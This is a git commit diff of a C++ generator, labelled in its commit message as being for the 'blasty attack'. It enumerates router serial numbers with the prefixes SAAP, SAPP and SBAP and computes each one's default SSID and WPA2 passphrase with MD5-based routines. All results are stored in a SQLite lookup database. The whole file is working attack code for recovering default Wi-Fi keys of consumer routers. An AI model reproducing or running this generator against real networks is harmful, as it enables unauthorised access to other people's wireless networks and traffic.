3a16e2204cf17f4d59a4a1d73dfed0661f1f8c1d
Dusan Klinec <dusan.klinec@gmail.com>
2016-07-03 14:38:46 +0200

    ups generator for blasty attack added

--- upc_keys_gen.cpp
+++ upc_keys_gen.cpp
@@ -5,15 +5,14 @@
 //
 
 #include <iostream>
-#include <signal.h>
 #include <openssl/md5.h>
 #include <sqlite3.h>
-#include <chrono>
+#include <string>
 #include <cstring>
+#include <chrono>
+#include <csignal>
 #include "main.h"
 #include "ahocorasick/ahocorasick.h"
-#include "ahocorasick/actypes.h"
-#include "upc_keys_gen.h"
 
 #define MAGIC_24GHZ 0xff8d8f20
 #define MAGIC_5GHZ 0xffd9da60
@@ -26,32 +25,56 @@
 #define MAX3 9999
 
 #define DB_NAME "upc.db"
-#define INSERT_PASS_QUERY "INSERT INTO wifi(id, serial, mode, ssid, pass, profanity) VALUES(?,?,?,?,?,?);"
 #define GET_LAST_QUERY "SELECT id FROM wifi WHERE 1 ORDER BY id DESC LIMIT 1;"
 
-#define CREATE_PASS_TABLE "CREATE TABLE IF NOT EXISTS `wifi` (" \
+#ifdef PROFANITY_ANALYSIS
+#  define INSERT_PASS_QUERY "INSERT INTO wifi(id, prefixIdx, serialInt, mode, ssid, pass, profanity) VALUES(?,?,?,?,?,?,?);"
+#else
+#  define INSERT_PASS_QUERY "INSERT INTO wifi(id, prefixIdx, serialInt, mode, ssid, pass) VALUES(?,?,?,?,?,?);"
+#endif
+
+#ifdef PROFANITY_ANALYSIS
+#  define CREATE_PASS_TABLE "CREATE TABLE IF NOT EXISTS `wifi` (" \
                             "id INT primary key, " \
-                            "serial TEXT, " \
+                            "prefixIdx INT, " \
+                            "serialInt INT, " \
                             "mode INT, " \
                             "ssid INT, " \
                             "pass TEXT, " \
                             "profanity TEXT);"
+#else
+#  define CREATE_PASS_TABLE "CREATE TABLE IF NOT EXISTS `wifi` (" \
+                            "id INT primary key, " \
+                            "prefixIdx INT, " \
+                            "serialInt INT, " \
+                            "mode INT, " \
+                            "ssid INT, " \
+                            "pass TEXT);"
+#endif
 
 using namespace std;
 using ns = chrono::nanoseconds;
-using get_time = chrono::steady_clock ;
+using get_time = chrono::steady_clock;
 
 constexpr char hexmap[] = {'0', '1', '2', '3', '4', '5', '6', '7',
                            '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
 
 void hex_str(unsigned char *data, char *dst, int len);
+
 int prepare_db();
+
 int deinit_db();
+
 int init_trie();
+
 int deinit_trie();
-inline long contains_profanity(char const * pass, size_t len);
-void compute_wpa2(int mode, char * serial, char * pass);
-uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic);
+
+inline long contains_profanity(char const *pass, size_t len);
+
+void compute_wpa2(int mode, char *serial, char *pass);
+
+uint32_t upc_generate_ssid(uint32_t *data, uint32_t magic);
+
 void intHandler(int dummy);
 
 sqlite3 *db;
@@ -63,13 +86,13 @@ sqlite3_stmt *pStmtCommit;
 AC_TRIE_t *trie;
 static volatile int keepRunning = 1;
 
-int main(int argc, char ** argv) {
+int main(int argc, char **argv) {
     cout << "Generation started..." << endl;
 
     int rc;
     char passwd[100] = {0};
 
-    if (prepare_db() != 0){
+    if (prepare_db() != 0) {
         deinit_db();
         return -1;
     }
@@ -78,8 +101,8 @@ int main(int argc, char ** argv) {
     signal(SIGINT, intHandler);
 
     // Load last generated record
-    long long lastIdx=-1;
-    if (sqlite3_step(pStmtLast) == SQLITE_ROW){
+    long long lastIdx = -1;
+    if (sqlite3_step(pStmtLast) == SQLITE_ROW) {
         lastIdx = sqlite3_column_int64(pStmtLast, 0);
         cout << "Last generated idx: " << lastIdx << endl;
     }
@@ -88,9 +111,13 @@ int main(int argc, char ** argv) {
     auto start = get_time::now();
     auto startTsx = get_time::now();
 
-    int openTsx=0;
-    unsigned long long i=0;
-    unsigned long long c=0;
+    int openTsx = 0;
+    unsigned long long i = 0;
+    unsigned long long c = 0;
+    unsigned long long serial_int = 0;
+    int pidx;
+    const char *serial_prefixes[] = {"SAAP", "SAPP", "SBAP"};
+    const int prefixes_cnt = 3;//(sizeof(serial_prefixes) / sizeof(serial_prefixes[0]));
 
     uint32_t buf[4];
     char serial[64];
@@ -100,77 +127,86 @@ int main(int argc, char ** argv) {
         for (buf[1] = 0; buf[1] <= MAX1 && keepRunning; buf[1]++)
             for (buf[2] = 0; buf[2] <= MAX2 && keepRunning; buf[2]++)
                 for (buf[3] = 0; buf[3] <= MAX3 && keepRunning; buf[3]++)
-                    for(int mode=0; mode<2; mode++, ++i, ++c){
-                    if (lastIdx > 0 && i <= lastIdx){
-                        continue;
-                    }
+                    for (int mode = 0; mode < 2; mode++) { // 2.4GHz vs. 5GHz
+                        for (pidx = 0; pidx < prefixes_cnt; ++pidx, ++i, ++c) { // router prefix serial
+                            if (lastIdx > 0 && i <= lastIdx) {
+                                continue;
+                            }
 
-                    // Commit previous transaction / begin a new one.
-                    if ((c % 10000) == 0){
-                        if (openTsx != 0){
-                            if (sqlite3_step(pStmtCommit) != SQLITE_DONE){
-                                printf("\nCould not commit tsx %s\n", sqlite3_errmsg(db));
+                            // Commit previous transaction / begin a new one.
+                            if ((c % 50000) == 0) {
+                                if (openTsx != 0) {
+                                    if (sqlite3_step(pStmtCommit) != SQLITE_DONE) {
+                                        printf("\nCould not commit tsx %s\n", sqlite3_errmsg(db));
+                                        return 1;
+                                    }
+                                }
+
+                                if (sqlite3_step(pStmtBegin) != SQLITE_DONE) {
+                                    printf("\nCould not start tsx %s\n", sqlite3_errmsg(db));
+                                    return 1;
+                                }
+
+                                startTsx = get_time::now();
+                                openTsx = 1;
+                            }
+
+                            sprintf(serial, "%s%d%02d%d%04d", serial_prefixes[pidx], buf[0], buf[1], buf[2], buf[3]);
+                            serial_int = (uint64_t)buf[3]
+                                         + ((uint64_t)buf[2] * 10000ULL)
+                                         + ((uint64_t)buf[1] * 100000ULL)
+                                         + ((uint64_t)buf[0] * 10000000ULL);
+
+                            ssid = upc_generate_ssid(buf, mode == 0 ? MAGIC_24GHZ : MAGIC_5GHZ);
+                            compute_wpa2(mode, serial, passwd);
+
+#ifdef PROFANITY_ANALYSIS
+                            // Profanity check
+                            char const *profanity = NULL;
+                            long profanity_idx = contains_profanity((const char *) passwd, 8);
+                            if (profanity_idx >= 0) {
+                                profanity = profanities[(int) profanity_idx];
+                            }
+#endif
+
+                            // Store to pass db. id, serial, mode, ssid, pass, profanity
+                            sqlite3_bind_int64(pStmt, 1, i);
+                            sqlite3_bind_int(pStmt, 2, pidx);
+                            sqlite3_bind_int64(pStmt, 3, serial_int);
+                            sqlite3_bind_int(pStmt, 4, mode);
+                            sqlite3_bind_int64(pStmt, 5, ssid);
+                            sqlite3_bind_text(pStmt, 6, passwd, 8, SQLITE_STATIC);
+
+#ifdef PROFANITY_ANALYSIS
+                            if (profanity_idx >= 0) {
+                                sqlite3_bind_text(pStmt, 7, (char *) profanity, (int) strlen(profanity), SQLITE_STATIC);
+                            } else {
+                                sqlite3_bind_null(pStmt, 7);
+                            }
+#endif
+
+                            if (sqlite3_step(pStmt) != SQLITE_DONE) {
+                                printf("\nCould not step %llu (execute) stmt %s\n", i, sqlite3_errmsg(db));
                                 return 1;
                             }
-                        }
+                            sqlite3_reset(pStmt);
 
-                        if (sqlite3_step(pStmtBegin) != SQLITE_DONE){
-                            printf("\nCould not start tsx %s\n", sqlite3_errmsg(db));
-                            return 1;
+                            // Progress monitoring.
+                            if ((i % 50000) == 0) {
+                                auto end = get_time::now();
+                                auto diff1 = end - startTsx;
+                                auto diff2 = end - start;
+                                printf("  %s = %10llu. %.03f%% Time round: %10lld ms, time total: %15lld ms\n", serial,
+                                       i, (i * 100 / 200000000.0),
+                                       chrono::duration_cast<ns>(diff1).count(),
+                                       chrono::duration_cast<ns>(diff2).count());
+                            }
                         }
-
-                        startTsx = get_time::now();
-                        openTsx=1;
                     }
-
-                    sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);
-
-                    ssid = upc_generate_ssid(buf, mode == 0 ? MAGIC_24GHZ : MAGIC_5GHZ);
-                    compute_wpa2(mode, serial, passwd);
-
-                    // Profanity check
-                    char const * profanity = NULL;
-                    long profanity_idx = contains_profanity((const char *)passwd, 8);
-                    if (profanity_idx >= 0) {
-                        profanity = profanities[(int) profanity_idx];
-//                        printf("    profanity in: %s = %10llu. SSID: %u Idx: %3ld, profanity: %12s, pass: %8s\n", serial, i,
-//                               ssid, profanity_idx, profanity, passwd);
-
-                    }
-
-                        // Store to pass db. id, serial, mode, ssid, pass, profanity
-                        sqlite3_bind_int64(pStmt, 1, i);
-                        sqlite3_bind_text(pStmt, 2, serial, strlen(serial), SQLITE_STATIC);
-                        sqlite3_bind_int(pStmt, 3, mode);
-                        sqlite3_bind_int64(pStmt, 4, ssid);
-                        sqlite3_bind_text(pStmt, 5, passwd, 8, SQLITE_STATIC);
-                        if (profanity_idx >= 0) {
-                            sqlite3_bind_text(pStmt, 6, (char *) profanity, (int) strlen(profanity), SQLITE_STATIC);
-                        } else {
-                            sqlite3_bind_null(pStmt, 6);
-                        }
-
-                        if (sqlite3_step(pStmt) != SQLITE_DONE) {
-                            printf("\nCould not step %llu (execute) stmt %s\n", i, sqlite3_errmsg(db));
-                            return 1;
-                        }
-                        sqlite3_reset(pStmt);
-
-
-                    // Progress monitoring.
-                    if ((i%10000) == 0){
-                        auto end = get_time::now();
-                        auto diff1 = end - startTsx;
-                        auto diff2 = end - start;
-                        printf("  %s = %10llu. %.03f%% Time round: %10lld ms, time total: %15lld ms\n", serial, i, (i*100/200000000.0),
-                               chrono::duration_cast<ns>(diff1).count(),
-                               chrono::duration_cast<ns>(diff2).count());
-                    }
-                }
 
     // Commit last transaction.
-    if (openTsx != 0){
-        if (sqlite3_step(pStmtCommit) != SQLITE_DONE){
+    if (openTsx != 0) {
+        if (sqlite3_step(pStmtCommit) != SQLITE_DONE) {
             printf("\nCould not commit tsx %s\n", sqlite3_errmsg(db));
             return 1;
         }
@@ -178,60 +214,58 @@ int main(int argc, char ** argv) {
 
     deinit_db();
     deinit_trie();
-    cout << "Generation done. Kill triggered: " << (keepRunning==0?"YES":"NO") << "i: " << i << endl;
+    cout << "Generation done. Kill triggered: " << (keepRunning == 0 ? "YES" : "NO") << "i: " << i << endl;
 
     return 0;
 }
 
-int prepare_db()
-{
+int prepare_db() {
     int rc = 0;
     rc = sqlite3_open(DB_NAME, &db);
-    if(rc){
+    if (rc) {
         fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
         sqlite3_close(db);
-        return(1);
+        return (1);
     }
 
     // Create table
     rc = sqlite3_exec(db, CREATE_PASS_TABLE, NULL, 0, NULL);
-    if( rc!=SQLITE_OK ){
+    if (rc != SQLITE_OK) {
         fprintf(stderr, "Could not create table %s\n", sqlite3_errmsg(db));
         sqlite3_close(db);
-        return(1);
+        return (1);
     }
 
     // Prepare statements
     rc = sqlite3_prepare(db, INSERT_PASS_QUERY, -1, &pStmt, NULL);
-    if(rc!=SQLITE_OK){
+    if (rc != SQLITE_OK) {
         fprintf(stderr, "Could not create prepared statement %s\n", sqlite3_errmsg(db));
         sqlite3_close(db);
-        return(1);
+        return (1);
     }
     rc = sqlite3_prepare(db, GET_LAST_QUERY, -1, &pStmtLast, NULL);
-    if(rc!=SQLITE_OK){
+    if (rc != SQLITE_OK) {
         fprintf(stderr, "Could not create prepared statement %s\n", sqlite3_errmsg(db));
         sqlite3_close(db);
-        return(1);
+        return (1);
     }
     rc = sqlite3_prepare(db, "BEGIN;", -1, &pStmtBegin, NULL);
-    if(rc!=SQLITE_OK){
+    if (rc != SQLITE_OK) {
         fprintf(stderr, "Could not create prepared statement %s\n", sqlite3_errmsg(db));
         sqlite3_close(db);
-        return(1);
+        return (1);
     }
     rc = sqlite3_prepare(db, "COMMIT;", -1, &pStmtCommit, NULL);
-    if(rc!=SQLITE_OK){
+    if (rc != SQLITE_OK) {
         fprintf(stderr, "Could not create prepared statement %s\n", sqlite3_errmsg(db));
         sqlite3_close(db);
-        return(1);
+        return (1);
     }
 
-    return(0);
+    return (0);
 }
 
-int deinit_db()
-{
+int deinit_db() {
     sqlite3_finalize(pStmt);
     sqlite3_finalize(pStmtLast);
     sqlite3_finalize(pStmtBegin);
@@ -241,16 +275,14 @@ int deinit_db()
     return 0;
 }
 
-inline void hex_str(unsigned char *data, char *dst, int len)
-{
+inline void hex_str(unsigned char *data, char *dst, int len) {
     for (int i = 0; i < len; ++i) {
-        dst[2 * i]     = hexmap[(data[i] & 0xF0u) >> 4];
+        dst[2 * i] = hexmap[(data[i] & 0xF0u) >> 4];
         dst[2 * i + 1] = hexmap[data[i] & 0x0Fu];
     }
 }
 
-int init_trie()
-{
+int init_trie() {
     AC_PATTERN_t patt;
 
     /* Get a new trie */
@@ -271,23 +303,21 @@ int init_trie()
         patt.id.type = AC_PATTID_TYPE_NUMBER;
 
         /* Add pattern to automata */
-        ac_trie_add (trie, &patt, 1);
+        ac_trie_add(trie, &patt, 1);
     }
 
     /* Now the preprocessing stage ends. You must finalize the trie. Remember
      * that you can not add patterns anymore. */
-    ac_trie_finalize (trie);
+    ac_trie_finalize(trie);
     return 0;
 }
 
-int deinit_trie()
-{
-    ac_trie_release (trie);
+int deinit_trie() {
+    ac_trie_release(trie);
     return 0;
 }
 
-inline long contains_profanity(char const * pass, size_t len)
-{
+inline long contains_profanity(char const *pass, size_t len) {
     long first_match = -1;
     AC_TEXT_t chunk;
     AC_MATCH_t match;
@@ -295,24 +325,22 @@ inline long contains_profanity(char const * pass, size_t len)
     chunk.length = len;
 
     /* Set the input text */
-    ac_trie_settext (trie, &chunk, 0);
+    ac_trie_settext(trie, &chunk, 0);
 
     /* Find matches */
     match = ac_trie_findnext(trie);
-    if (!match.size){
+    if (!match.size) {
         return first_match;
     }
 
     return match.patterns[0].id.u.number;
 }
 
-void intHandler(int dummy)
-{
+void intHandler(int dummy) {
     keepRunning = 0;
 }
 
-void hash2pass(uint8_t *in_hash, char *out_pass)
-{
+void hash2pass(uint8_t *in_hash, char *out_pass) {
     uint32_t i, a;
 
     for (i = 0; i < 8; i++) {
@@ -330,8 +358,7 @@ void hash2pass(uint8_t *in_hash, char *out_pass)
     out_pass[8] = 0;
 }
 
-uint32_t mangle(uint32_t *pp)
-{
+uint32_t mangle(uint32_t *pp) {
     uint32_t a, b;
 
     a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
@@ -340,8 +367,7 @@ uint32_t mangle(uint32_t *pp)
     return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
 }
 
-uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
-{
+uint32_t upc_generate_ssid(uint32_t *data, uint32_t magic) {
     uint32_t a, b;
 
     a = data[1] * 10 + data[2];
@@ -350,7 +376,7 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
     return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
 }
 
-void compute_wpa2(int mode, char * serial, char * pass){
+void compute_wpa2(int mode, char *serial, char *pass) {
     MD5_CTX ctx;
     uint8_t message_digest[20];
     char serial_input[64];
@@ -362,8 +388,8 @@ void compute_wpa2(int mode, char * serial, char * pass){
     ln = strlen(serial);
     memset(serial_input, 0, 64);
     if (mode == 2) {
-        for(i=0; i<ln; i++) {
-            serial_input[ln-1-i] = serial[i];
+        for (i = 0; i < ln; i++) {
+            serial_input[ln - 1 - i] = serial[i];
         }
     } else {
         memcpy(serial_input, serial, ln);
@@ -374,13 +400,13 @@ void compute_wpa2(int mode, char * serial, char * pass){
     MD5_Final(h1, &ctx);
 
     for (i = 0; i < 4; i++) {
-        hv[i] = *(uint16_t *)(h1 + i*2);
+        hv[i] = *(uint16_t *) (h1 + i * 2);
     }
 
     w1 = mangle(hv);
 
     for (i = 0; i < 4; i++) {
-        hv[i] = *(uint16_t *)(h1 + 8 + i*2);
+        hv[i] = *(uint16_t *) (h1 + 8 + i * 2);
     }
 
     w2 = mangle(hv);
